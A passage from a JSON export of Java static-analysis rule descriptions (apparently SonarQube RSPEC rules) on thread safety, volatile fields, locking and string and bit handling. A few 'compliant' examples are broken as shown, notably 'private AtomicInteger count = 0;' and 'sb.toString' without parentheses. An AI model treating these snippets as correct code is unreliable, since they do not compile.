data-diff-type=\"compliant\">\nclass Parent {\n  public static int counter;\n}\n\nclass Child extends Parent {\n  public Child() {\n    Parent.counter++;\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-3252","summary":"\"static\" base class members should not be accessed via derived types","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>For maximum reusability, methods should accept parameters with as little specialization as possible. So unless specific features from a child class\nare required by a method, a type higher up the class hierarchy should be used instead.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void printSize(ArrayList&lt;Object&gt; list) {  // Collection can be used instead\n    System.out.println(list.size());\n}\n\npublic static void loop(List&lt;Object&gt; list) { // java.lang.Iterable can be used instead\n   for (Object o : list) {\n     o.toString();\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void printSize(Collection&lt;?&gt; list) {  // Collection can be used instead\n    System.out.println(list.size());\n}\n\npublic static void loop(Iterable&lt;?&gt; list) { // java.lang.Iterable can be used instead\n   for (Object o : list) {\n     o.toString();\n  }\n}\n</pre>\n<h3>Exceptions</h3>\n<p>Parameters in non-public methods are not checked, because such methods are not intended to be generally reusable. <code>java.lang.String</code>\nparameters are excluded, because String is immutable and can not be always substituted for more generic type. Parameters used in any other context\nthan method invocation or enhanced for loop are also excluded.</p>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3242","summary":"Method parameters should be declared with base types","tags":["api-design"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Using compound operators as well as increments and decrements (and toggling, in the case of <code>boolean</code>s) on primitive fields are not\natomic operations. That is, they donât happen in a single step. For instance, when a <code>volatile</code> primitive field is incremented or\ndecremented you run the risk of data loss if threads interleave in the steps of the update. Instead, use a guaranteed-atomic class such as\n<code>AtomicInteger</code>, or synchronize the access.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nprivate volatile int count = 0;\nprivate volatile boolean boo = false;\n\npublic void incrementCount() {\n  count++;  // Noncompliant\n}\n\npublic void toggleBoo(){\n  boo = !boo;  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nprivate AtomicInteger count = 0;\nprivate boolean boo = false;\n\npublic void incrementCount() {\n  count.incrementAndGet();\n}\n\npublic synchronized void toggleBoo() {\n  boo = !boo;\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/SjdGBQ\">CERT, VNA02-J.</a> - Ensure that compound operations on shared variables are atomic\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3078","summary":"\"volatile\" variables should not be used with compound operators","tags":["multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Marking an array <code>volatile</code> means that the array itself will always be read fresh and never thread cached, but the items <em>in</em> the\narray will not be. Similarly, marking a mutable object field <code>volatile</code> means the object <em>reference</em> is <code>volatile</code> but\nthe object itself is not, and other threads may not see updates to the object state.</p>\n<p>This can be salvaged with arrays by using the relevant AtomicArray class, such as <code>AtomicIntegerArray</code>, instead. For mutable objects,\nthe <code>volatile</code> should be removed, and some other method should be used to ensure thread-safety, such as synchronization, or ThreadLocal\nstorage.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nprivate volatile int [] vInts;  // Noncompliant\nprivate volatile MyObj myObj;  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nprivate AtomicIntegerArray vInts;\nprivate MyObj myObj;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UzdGBQ\">CERT, CON50-J.</a> - Do not assume that declaring a reference volatile guarantees safe\n  publication of the members of the referenced object </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3077","summary":"Non-primitive fields should not be \"volatile\"","tags":["multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>getClass</code> should not be used for synchronization in non-<code>final</code> classes because child classes will synchronize on a\ndifferent object than the parent or each other, allowing multiple threads into the code block at once, despite the <code>synchronized</code>\nkeyword.</p>\n<p>Instead, hard code the name of the class on which to synchronize or make the class <code>final</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass {\n  public void doSomethingSynchronized(){\n    synchronized (this.getClass()) {  // Noncompliant\n      // ...\n    }\n  }\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class MyClass {\n  public void doSomethingSynchronized(){\n    synchronized (MyClass.class) {\n      // ...\n    }\n  }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/qTdGBQ\">CERT, LCK02-J.</a> - Do not synchronize on the class object returned by getClass() </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3067","summary":"\"getClass\" should not be used for synchronization","tags":["multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p><code>enum</code>s are generally thought of as constant, but an <code>enum</code> with a <code>public</code> field or <code>public</code> setter is\nnon-constant. Ideally fields in an <code>enum</code> are <code>private</code> and set in the constructor, but if thatâs not possible, their visibility\nshould be reduced as much as possible.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic enum Continent {\n\n  NORTH_AMERICA (23, 24709000),\n  // ...\n  EUROPE (50, 39310000);\n\n  public int countryCount;  // Noncompliant\n  private int landMass;\n\n  Continent(int countryCount, int landMass) {\n    // ...\n  }\n\n  public void setLandMass(int landMass) {  // Noncompliant\n    this.landMass = landMass;\n  }\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic enum Continent {\n\n  NORTH_AMERICA (23, 24709000),\n  // ...\n  EUROPE (50, 39310000);\n\n  private int countryCount;\n  private int landMass;\n\n  Continent(int countryCount, int landMass) {\n    // ...\n  }\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3066","summary":"\"enum\" fields should not be publicly mutable","tags":["bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>When using <code>Math.min()</code> and <code>Math.max()</code> together for bounds checking, itâs important to feed the right operands to each\nmethod. <code>Math.min()</code> should be used with the <strong>upper</strong> end of the range being checked, and <code>Math.max()</code> should be\nused with the <strong>lower</strong> end of the range. Get it backwards, and the result will always be the same end of the range.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n  private static final int UPPER = 20;\n  private static final int LOWER = 0;\n\n  public int doRangeCheck(int num) {    // Let's say num = 12\n    int result = Math.min(LOWER, num);  // result = 0\n    return Math.max(UPPER, result);     // Noncompliant; result is now 20: even though 12 was in the range\n  }\n</pre>\n<h3>Compliant solution</h3>\n<p>Swapping method <code>min()</code> and <code>max()</code> invocations without changing parameters.</p>\n<pre>\n  private static final int UPPER = 20;\n  private static final int LOWER = 0;\n\n  public int doRangeCheck(int num) {    // Let's say num = 12\n    int result = Math.max(LOWER, num);  // result = 12\n    return Math.min(UPPER, result);     // Compliant; result is still 12\n  }\n</pre>\n<p>or swapping bounds <code>UPPER</code> and <code>LOWER</code> used as parameters without changing the invoked methods.</p>\n<pre>\n  private static final int UPPER = 20;\n  private static final int LOWER = 0;\n\n  public int doRangeCheck(int num) {    // Let's say num = 12\n    int result = Math.min(UPPER, num);  // result = 12\n    return Math.max(LOWER, result);     // Compliant; result is still 12\n  }\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3065","summary":"Min and max used in combination should not always return the same value","tags":["symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Double-checked locking can be used for lazy initialization of <code>volatile</code> fields, but only if field assignment is the last step in the\n<code>synchronized</code> block. Otherwise you run the risk of threads accessing a half-initialized object.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass {\n\n  private volatile List&lt;String&gt; strings;\n\n  public List&lt;String&gt; getStrings() {\n    if (strings == null) {  // check#1\n      synchronized(MyClass.class) {\n        if (strings == null) {\n          strings = new ArrayList&lt;&gt;();  // Noncompliant\n          strings.add(\"Hello\");  //When threadA gets here, threadB can skip the synchronized block because check#1 is false\n          strings.add(\"World\");\n        }\n      }\n    }\n    return strings;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class MyClass {\n\n  private volatile List&lt;String&gt; strings;\n\n  public List&lt;String&gt; getStrings() {\n    if (strings == null) {  // check#1\n      synchronized(MyClass.class) {\n        if (strings == null) {\n          List&lt;String&gt; tmpList = new ArrayList&lt;&gt;();\n          tmpList.add(\"Hello\");\n          tmpList.add(\"World\");\n          strings = tmpList;\n        }\n      }\n    }\n    return strings;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/6zdGBQ\">CERT, LCK10-J.</a> - Use a correct form of the double-checked locking idiom </li>\n</ul>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S2168} - Double-checked locking should not be used </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3064","summary":"Assignment of lazy-initialized members should be the last step with double-checked locking","tags":["multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>StringBuffer</code> and <code>StringBuilder</code> instances that are <code>append</code>ed but never <code>toString</code>ed needlessly\nclutter the code, and worse are a drag on performance. Either they should be removed, or the missing <code>toString</code> call added.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void doSomething(List&lt;String&gt; strings) {\n\n  StringBuilder sb = new StringBuilder();  // Noncompliant\n  sb.append(\"Got: \");\n  for (String str : strings) {\n    sb.append(str).append(\", \");\n    // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void doSomething(List&lt;String&gt; strings) {\n\n  for (String str : strings) {\n    // ...\n  }\n}\n</pre>\n<p>or</p>\n<pre>\npublic void doSomething(List&lt;String&gt; strings) {\n\n  StringBuilder sb = new StringBuilder();\n  sb.append(\"Got: \");\n  for (String str : strings) {\n    sb.append(str).append(\", \");\n    // ...\n  }\n\n  LOGGER.info(sb.toString);\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule ignores <code>StringBuffer</code>s and <code>StringBuilder</code>s that are passed as method arguments on the grounds that they are\nlikely <code>toString</code>ed there.</p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3063","summary":"\"StringBuilder\" data should be used","tags":["performance"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The compiler automatically initializes class fields to their default values before setting them with any initialization values, so there is no need\nto explicitly set a field to its default value. Further, under the logic that cleaner code is better code, itâs considered poor style to do so.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass {\n\n  int count = 0;  // Noncompliant\n  // ...\n\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class MyClass {\n\n  int count;\n  // ...\n\n}\n</pre>\n<h3>Exceptions</h3>\n<p><code>final</code> fields are ignored.</p>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3052","summary":"Fields should not be initialized to default values","tags":["convention","finding"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When a method loops multiple over the same set of data, whether itâs a list or a set of numbers, it is highly likely that the method could be made\nmore efficient by combining the loops into a single set of iterations.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void doSomethingToAList(List&lt;String&gt; strings) {\n  for (String str : strings) {\n    doStep1(str);\n  }\n  for (String str : strings) {  // Noncompliant\n    doStep2(str);\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void doSomethingToAList(List&lt;String&gt; strings) {\n  for (String str : strings) {\n    doStep1(str);\n    doStep2(str);\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3047","summary":"Multiple loops over the same set should be combined","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>When two locks are held simultaneously, a <code>wait</code> call only releases one of them. The other will be held until some other thread requests\na lock on the awaited object. If no unrelated code tries to lock on that object, then all other threads will be locked out, resulting in a\ndeadlock.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nsynchronized (this.mon1) {  // threadB can't enter this block to request this.mon2 lock &amp; release threadA\n\tsynchronized (this.mon2) {\n\t\tthis.mon2.wait();  // Noncompliant; threadA is stuck here holding lock on this.mon1\n\t}\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3046","summary":"\"wait\" should not be called when multiple locks are held","tags":["multi-threading","deadlock"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Synchronization is a mechanism used when multithreading in Java to ensure that only one thread executes a given block of code at a time. This is\ndone to avoid bugs that can occur when multiple threads share a given state and try to manipulate simultaneously.</p>\n<p>Object serialization is not thread-safe by default. In a multithreaded environment, one option is to mark <code>writeObject</code> with\n<code>synchronized</code> to improve thread safety. It is highly suspicious, however, if <code>writeObject</code> is the only\n<code>synchronized</code> method in a class. It may indicate that serialization is not required, as multithreading is not used. Alternatively, it\ncould also suggest that other methods in the same class have been forgotten to be made thread-safe.</p>\n<h2>How to fix it</h2>\n<p>Consider whether this class is used in a multithreaded context. If it is, ask yourself whether other methods in this class should also be marked as\n<code>synchronized</code>. Otherwise, remove the <code>synchronized</code> modifier from this method.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class RubberBall implements Serializable {\n\n  private Color color;\n  private int diameter;\n\n  public RubberBall(Color color, int diameter) {\n    // ...\n  }\n\n  public void bounce(float angle, float velocity) {\n    // ...\n  }\n\n  private synchronized void writeObject(ObjectOutputStream stream) throws IOException { // Noncompliant, \"writeObject\" is the only synchronized method in this class\n    // ...\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class RubberBall implements Serializable {\n\n  private Color color;\n  private int diameter;\n\n  public RubberBall(Color color, int diameter) {\n    // ...\n  }\n\n  public void bounce(float angle, float velocity) {\n    // ...\n  }\n\n  private void writeObject(ObjectOutputStream stream) throws IOException { // Compliant, no methods in this class are synchronized\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/io/Serializable.html\">Java SE 17 &amp; JDK 17 - Serializable\n  Javadoc</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/essential/concurrency/syncmeth.html\">The Javaâ¢ Tutorials - Synchronized Methods</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3042","summary":"\"writeObject\" should not be the only \"synchronized\" code in a class","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>There are various <code>String</code> operations that take one or more character indexes as arguments and return a portion of the original string.\nIndexing in this context is zero-based, meaning that the first characterâs index is <code>0</code>. As a result, given a string <code>myString</code>,\nits last character is at index <code>myString.length() - 1</code>.</p>\n<p>The <code>String</code> operation methods throw a <code>StringIndexOutOfBoundsException</code> when one of their index argument is smaller than 0\n(E.G.: -1). <code>String::substring</code> also throws this exception when the <code>beginIndex</code> or <code>endIndex</code> argument is larger\nthan <code>myString.length()</code>, and <code>String::charAt</code> when the <code>index</code> argument is larger than <code>myString.length() -\n1</code> For instance, it is not possible to use <code>String::charAt</code> to retrieve a value before the start or after the end of a string.\nFurthermore, it is not possible to use <code>String::substring</code> with <code>beginIndex &gt; endIndex</code> to reverse the order of characters in\na string.</p>\n<p>This rule raises an issue when a negative literal or an index that is too large is passed as an argument to the <code>String::substring</code>,\n<code>String::charAt</code>, and related methods. It also raises an issue when the start index passed to <code>String::substring</code> is larger than\nthe end index.</p>\n<h2>How to fix it</h2>\n<p>Use non-negative indexes that are smaller than or equal to the length of the string in question with <code>String::substring</code> and strictly\nsmaller with <code>String::charAt</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nString speech = \"Lorem ipsum dolor sit amet\";\n\nString substr1 = speech.substring(-1, speech.length()); // Noncompliant, -1 is out of bounds\nString substr2 = speech.substring(speech.length(), 0);  // Noncompliant, the beginIndex must be smaller than or equal to the endIndex\nchar ch = speech.charAt(speech.length());               // Noncompliant, speech.length() is out of bounds\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nString speech = \"Lorem ipsum dolor sit amet\";\n\nString substr1 = speech;                                         // Compliant, no string operation used\nString substr2 = new StringBuilder(speech).reverse().toString(); // Compliant, the string can be reversed using StringBuilder::reverse()\nchar ch = speech.charAt(speech.length() - 1);                    // Compliant, speech.length() - 1 is in bounds.\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3039","summary":"Indexes to passed to \"String\" operations should be within the string's bounds","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Thereâs no point in redundantly defining an <code>abstract</code> method with the same signature as a method in an <code>interface</code> that the\nclass <code>implements</code>. Any concrete child classes will have to implement the method either way.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic interface Reportable {\n  String getReport();\n}\n\npublic abstract class AbstractRuleReport implements Reportable{\n  public abstract String getReport();  // Noncompliant\n\n  // ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3038","summary":"Abstract methods should not be redundant","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In Java, numeric promotions happen when two operands of an arithmetic expression have different sizes. More specifically, narrower operands get\npromoted to the type of wider operands. For instance, an operation between a <code>byte</code> and an <code>int</code>, will trigger a promotion of\nthe <code>byte</code> operand, converting it into an <code>int</code>.</p>\n<p>When this happens, the sequence of 8 bits that represents the <code>byte</code> will need to be extended to match the 32-bit long sequence that\nrepresents the <code>int</code> operand. Since Java uses twoâs complement notation for signed number types, the promotion will fill the missing\nleading bits with zeros or ones, depending on the sign of the value. For instance, the byte <code>0b1000_0000</code> (equal to <code>-128</code> in\ndecimal notation), when promoted to <code>int</code>, will become <code>0b1111_1111_1111_1111_1111_1111_1000_0000</code>.</p>\n<p>When performing shifting or bitwise operations without considering that bytes are signed, the bits added during the promotion may have unexpected\neffects on the final result of the operations.</p>\n<h2>How to fix it</h2>\n<p>This rule raises an issue any time a <code>byte</code> value is used as an operand combined with shifts without being masked.</p>\n<p>To prevent such accidental value conversions, you can mask promoted bytes to only consider the least significant 8 bits. Masking can be achieved\nwith the bitwise AND operator <code>&amp;</code> and the appropriate mask of <code>0xff</code> (255 in decimal and <code>0b1111_1111</code> in binary)\nor, since Java 8, with the more convenient <code>Byte.toUnsignedInt(byte b)</code> or <code>Byte.toUnsignedLong(byte b)</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n  public static void main(String[] args) {\n    byte[] bytes12 = BigInteger.valueOf(12).toByteArray(); // This byte array will be simply [12]\n    System.out.println(intFromBuffer(bytes12)); // In this case, the bytes promotion will not cause any issues, and \"12\" will be printed.\n\n    // Here the bytes will be [2, -128] since 640 in binary is represented as 0b0000_0010_1000_0000\n    // which is equivalent to the concatenation of 2 bytes: 0b0000_0010 = 2, and 0b1000_0000 = -128\n    byte[] bytes640 = BigInteger.valueOf(640).toByteArray();\n\n    // In this case, the shifting operation combined with the bitwise OR, will produce the wrong binary string and \"-128\" will be printed.\n    System.out.println(intFromBuffer(bytes640));\n  }\n\n  static int intFromBuffer(byte[] bytes) {\n    int originalInt = 0;\n    for (int i = 0; i &lt; bytes.length; i++) {\n      // Here the right operand of the bitwise OR, which is a byte, will be promoted to an `int`\n      // and if its value was negative, the added ones in front of the binary string will alter the value of the `originalInt`\n      originalInt = (originalInt &lt;&lt; 8) | bytes[i]; // Noncompliant\n    }\n    return originalInt;\n  }\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n  public static void main(String[] args) {\n    byte[] bytes12 = BigInteger.valueOf(12).toByteArray(); // This byte array will be simply [12]\n    System.out.println(intFromBuffer(bytes12)); // In this case, the bytes promotion will not cause any issues, and \"12\" will be printed.\n\n    // Here the bytes will be [2, -128] since 640 in binary is represented as 0b0000_0010_1000_0000\n    // which is equivalent to the concatenation of 2 bytes: 0b0000_0010 = 2, and 0b1000_0000 = -128\n    byte[] bytes640 = BigInteger.valueOf(640).toByteArray();\n\n    // This will correctly print \"640\" now.\n    System.out.println(intFromBuffer(bytes640));\n  }\n\n  static int intFromBuffer(byte[] bytes) {\n    int originalInt = 0;\n    for (int i = 0; i &lt; bytes.length; i++) {\n      originalInt = (originalInt &lt;&lt; 8) | Byte.toUnsignedInt(bytes[i]); // Compliant, only the relevant 8 least significant bits will affect the bitwise OR\n    }\n    return originalInt;\n  }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/kDZGBQ\">CERT, NUM52-J.</a> - Be aware of numeric promotion behavior </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Signed_number_representations#Two.27s_complement\">Wikipedia</a> - Twoâs complement </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3034","summary":"Raw byte values should not be used in bitwise operations in combination with shifts","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>It is inefficient to build a <code>String</code> from a <code>StringBuilder</code> or <code>StringBuffer</code> just to check if itâs empty.\nInstead, directly use the <code>.isEmpty</code> method.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nStringBuilder sb = new StringBuilder();\n// ...\nif (\"\".equals(sb.toString()) { // Noncompliant\n  // ...\n}\nif (sb.toString().isEmpty()) { // Noncompliant\n  // ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nStringBuilder sb = new StringBuilder();\n// ...\nif (sb.isEmpty()) {\n  // ...\n}\nif (sb.isEmpty()) {\n  // ...\n}\n</pre>\n<h3>Benchmarks</h3>\n<table>\n  <colgroup>\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n    <col style=\"width: 20%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Method</th>\n      <th>stringBuilderSize</th>\n      <th>Runtime</th>\n      <th>Average time</th>\n      <th>Error margin</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p>isEmpty</p></td>\n      <td><p>10</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>6.57 ns/op</p></td>\n      <td><p>Â±0.38 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>isEmpty</p></td>\n      <td><p>100</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>6.68 ns/op</p></td>\n      <td><p>Â±0.10 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>isEmpty</p></td>\n      <td><p>1000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>6.80 ns/op</p></td>\n      <td><p>Â±0.12 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>length</p></td>\n      <td><p>10</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>6.83 ns/op</p></td>\n      <td><p>Â±0.12 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>length</p></td>\n      <td><p>100</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>6.66 ns/op</p></td>\n      <td><p>Â±0.11 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>length</p></td>\n      <td><p>1000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>6.67 ns/op</p></td>\n      <td><p>Â±0.07 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>toStringEquals</p></td>\n      <td><p>10</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>13.92 ns/op</p></td>\n      <td><p>Â±0.18 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>toStringEquals</p></td>\n      <td><p>100</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>59.09 ns/op</p></td>\n      <td><p>Â±0.53 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>toStringEquals</p></td>\n      <td><p>1000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>465.79 ns/op</p></td>\n      <td><p>Â±5.86 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>toStringIsEmpty</p></td>\n      <td><p>10</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>13.83 ns/op</p></td>\n      <td><p>Â±0.23 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>toStringIsEmpty</p></td>\n      <td><p>100</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>60.06 ns/op</p></td>\n      <td><p>Â±3.42 ns/op</p></td>\n    </tr>\n    <tr>\n      <td><p>toStringIsEmpty</p></td>\n      <td><p>1000</p></td>\n      <td><p>Temurin 21</p></td>\n      <td><p>484.58 ns/op</p></td>\n      <td><p>Â±4.24 ns/op</p></td>\n    </tr>\n  